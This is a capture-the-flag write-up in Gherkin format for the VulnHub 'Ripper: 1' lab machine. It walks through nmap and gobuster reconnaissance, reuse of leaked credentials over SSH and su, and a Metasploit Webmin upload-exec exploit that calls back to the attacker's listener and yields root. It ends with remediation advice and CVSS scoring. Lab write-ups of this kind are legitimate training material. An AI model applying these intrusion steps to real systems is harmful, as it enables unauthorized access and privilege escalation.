## Version 1.4.1
## language: en

Feature:
  TOE:
    vulnhub Ripper: 1
  Location:
    https://192.168.1.7:1000
  CWE:
    CWE-77: https://cwe.mitre.org/data/definitions/77.html
  Rule:
    REQ.004: https://docs.fluidattacks.com/criteria/vulnerabilities/004
    REQ.014: https://docs.fluidattacks.com/criteria/vulnerabilities/014
    REQ.020: https://docs.fluidattacks.com/criteria/vulnerabilities/020
    REQ.061: https://docs.fluidattacks.com/criteria/vulnerabilities/061
    REQ.359: https://docs.fluidattacks.com/criteria/vulnerabilities/359
  Goal:
    Get root privileges and get flag from root
  Recommendation:
    Upgrade tools like Webmin, don't save credentials in source code and files

  Background:

  Hacker's software:
    | <Software name> | <Version> |
    | Kali linux | 5.10.28 |
    | Virtualbox | 6.1.34 |
    | Firefox | 91.9.0 |
    | Nmap | 7.92 |
    | arp-scan | 1.9.7 |
    | Gobuster | 3.1.0 |
  TOE information:
    Given a .ova file
    Then I ran the file in Virtualbox
    Then I could see the virtual machine was running [evidence](01.png)
    And the server is running SSH version OpenSSH 7.6p1
    And HTTP version Apache httpd 2.4.29
    And HTTP version Webmin MiniServ 1.910

  Scenario: Normal use case
    Given access to a virtual server
    And a mac address [evidence](02.png)
    Then I execute the following commands:
    """
    $ nmap -sP 192.168.1.0/24
    $ sudo arp-scan -l | grep 08
    """
    When looking at the result [evidence](03.png)
    Then I decided to visit the site:
    """
    http://192.168.1.7/
    """
    When looking in the browser
    Then I saw the initial apache2 configuration [evidence](04.png)

  Scenario: Dynamic detection
    Given an IPv4 address 192.168.1.7
    Then I ran a scan report
    And I execute the following command:
    """
    $ nmap -p- -sV -sC 192.168.1.7
    """
    Then I could see services and which ports are open [evidence](05.png)
    And I decided to explore the different ports
    Then I noted that port 22 was used by SSH
    And its version OpenSSH 7.6p1
    Then I noted that port 80 was used by HTTP
    And its version Apache httpd 2.4.29
    Then I noted that port 1000 was used by HTTP
    And its version Webmin MiniServ 1.910
    Then I decided to search possible hidden directories with gobuster
    And I execute the following command:
    """
    $ gobuster dir -u http://192.168.1.7
    -w /usr/share/wordlist/dirb/common.txt
    """
    Then I got the next result [evidence](06.png)
    When I checked it was not something interesting
    Then I used a bigger wordlist
    And I execute the following command:
    """
    $ gobuster dir -u http://192.168.1.7 -w
    /usr/share/dirbuster/wordlist/directory-list-lowercase-2.3-medium.txt
    """
    Then I got a directory to look at called "rips" [evidence](07.png)
    Then I decided to visit the site:
    """
    http://192.168.1.7/rips
    """
    When looking in the browser
    Then I saw the rips scanner tool [evidence](08.png)
    Then I decided to scan the default file "/var/www"
    Then I got a file called "secret.php"
    When looking at its content
    Then I could see a username and a password [evidence](09.png)
    Then I decided to visit the site from webmin tool:
    """
    https://192.168.1.7:1000
    """
    When looking in the browser
    Then I could see a login form [evidence](10.png)
    When looking for a Webmin MiniServ 1.910 vulnerability
    Then I found the following article [evidence](11.png)
    """
    https://www.exploit-db.com/exploits/46984
    """
    When I checked it was an arbitrary command execution vulnerability
    And that I needed a username and a password to execute it
    Then I could conclude that I needed to look for webmin credentials
    And exploit the Webmin MiniServ 1.910 vulnerability

  Scenario: Exploitation
    Given the site https://192.168.1.7:1000
    And the Webmin MiniServ 1.910 vulnerability
    And a username and a password
    Then I could use SSH using the given credentials
    Then I execute the following command: [evidence](12.png)
    """
    $ ssh ripper@192.168.1.7
    """
    Then I become the ripper user
    When looking for files that the user "ripper" could read
    Then I execute the following command:
    """
    $ find / -user ripper 2>/dev/null
    """
    Then I got a file called "secret.file" [evidence](13.png)
    When looking at its content
    Then I could see a password
    And probably for the other user called "cubes"[evidence](14.png)
    Then I changed the user using the following command:
    """
    $ su - cubes
    """
    When looking for files that the user "cubes" could read
    Then I execute the following command: [evidence](15.png)
    """
    $ find / -user cubes 2>/dev/null
    """
    Then I got a file called "miniser.log" [evidence](16.png)
    When looking at its content
    Then I could see a webmin authentication log
    And a username and a password [evidence](17.png)
    Then I could execute an arbitrary command using msfconsole
    Then I run the following commands: [evidence](18.png)
    """
    $ msfconsole
    > search webmin
    > use exploit/unix/webapp/webmin_upload_exec
    > set RHOSTS 192.168.1.7
    > set USERNAME admin
    > set PASSWORD tokiohotel
    > set LHOST 192.168.1.106
    > set SSL true
    > exploit
    """
    When I got a positive response [evidence](19.png)
    Then I become the root user
    And I got the flag [evidence](20.png)

  Scenario: Remediation
    Given that the system has a vulnerability
    Then is necessary to upgrade the Webmin tool
    And is necessary to avoid saving credentials in files or source code
    Then I can confirm that the server is less vulnerable

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    7.5/10 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/
  Temporal: Attributes that measure the exploit's popularity and fixability
    7.0/10 (High) - E:F/RL:O/RC:C
  Environmental: Unique and relevant attributes to a specific user environment
    7.0/10 (High) - CR:M/IR:M/AR:M

  Scenario: Correlations
    No correlations have been found to this date 2022-07-25
